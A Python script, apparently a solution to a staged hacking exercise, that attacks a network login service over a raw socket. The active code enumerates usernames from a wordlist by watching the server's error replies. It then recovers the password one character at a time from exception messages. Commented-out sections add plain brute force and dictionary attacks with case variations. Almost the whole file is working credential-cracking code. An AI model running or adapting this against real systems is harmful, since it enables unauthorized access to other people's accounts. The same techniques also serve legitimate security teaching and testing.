from socket import socket, AF_INET, SOCK_STREAM
import sys
import string
import os
import itertools
import json


def send_message(connection_socket: socket, message: str):
    connection_socket.send(message.encode())
    response = connection_socket.recv(1024).decode()
    return response


def jsonify_message(login: str, password: str):
    login_dict = {'login':login, 'password':password}
    return json.dumps(login_dict)


def run():
    """Hacks a website specified by the IP address and port number as the input arguments to the program.
    The user encodes a specially crafted message which is sent to the server and receives a reply.

    Phase 1/2 - simple brute force method (unlikely to be successful unless password is short and
    simple)

    Phase 3 - brute force of dictionary passwords with varying uppercase/lowercase letters

    Phase 4 - brute force of passwords with known admin usernames"""

    with socket(AF_INET, SOCK_STREAM) as connection_socket:
        # Obtain command line argument values
        ip_address = sys.argv[1]
        port = int(sys.argv[2])

        # establish connection
        connection_socket.connect((ip_address, port))

        # for phase 4 - using common login dictionary and server exception to deduce password
        dir_path = os.path.dirname(os.path.realpath(__file__))
        file_path = dir_path + '/logins.txt'

        # attempt to break the login by sending blank password
        login = ''

        with open(file_path,'r') as login_file:
            for line in login_file:
                pwd = ' '
                #login_combos_tuples = zip(login_lower,login_upper)
                #login_combos = itertools.product(*login_combos_tuples)

                login = line.strip()
                json_msg = jsonify_message(login,pwd)
                response_string = send_message(connection_socket,json_msg)
                response_dict = json.loads(response_string)
                result = response_dict['result']
                if result == 'Wrong password!':
                    break

                login = ''

        # At this point, either the login is known, or no login was found.
        if not login:
            exit(1)

        # determine password based on exception vulnerability
        password_test_string = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
        password_crack = []
        result = ''

        while result != 'Connection success!':
            for letter in password_test_string:
                response_string = send_message(connection_socket,jsonify_message(login,''.join(password_crack) + letter))
                response_dict = json.loads(response_string)
                result = response_dict['result']
                if result.startswith('Exception') or result == 'Connection success!':
                    password_crack.append(letter)
                    break

        # print login and password
        print_dict = {'login':login,'password':''.join(password_crack)}
        print(json.dumps(print_dict))

        # close the socket (managed via context manager)



        # # for phase 3 - using common password file
        # dir_path = os.path.dirname(os.path.realpath(__file__))
        # file_path = dir_path + '/passwords.txt'
        #
        # with open(file_path, 'r') as pass_file:
        #     for line in pass_file:
        #         pwd_lower = line.strip().lower()
        #         pwd_upper = line.strip().upper()
        #         pass_combos_tuples = zip(pwd_lower, pwd_upper)
        #         pass_combos = itertools.product(*pass_combos_tuples)
        #
        #         for combo in pass_combos:
        #             pwd = ''.join(combo)
        #             response = send_message(connection_socket, pwd)
        #             if response == 'Connection success!':
        #                 print(pwd)
        #                 exit(0)

        # # for phase 1 / 2
        # password_brute_string = string.ascii_lowercase + string.digits
        # repeat = 1
        # attempts = 1
        #
        # # Limit brute force to 1,000,000 attempts
        # while attempts <= 1000000:
        #     pass_combos = itertools.product(password_brute_string, repeat=repeat)
        #     for combo in pass_combos:
        #         pwd = ''.join(combo)
        #         response = send_message(connection_socket, pwd)
        #         attempts += 1
        #         if response == 'Connection success!':
        #             print(pwd)
        #             exit(0)
        #         else:
        #             continue
        #     repeat += 1

    # close the socket (managed by context manager)


if __name__ == '__main__':
    run()
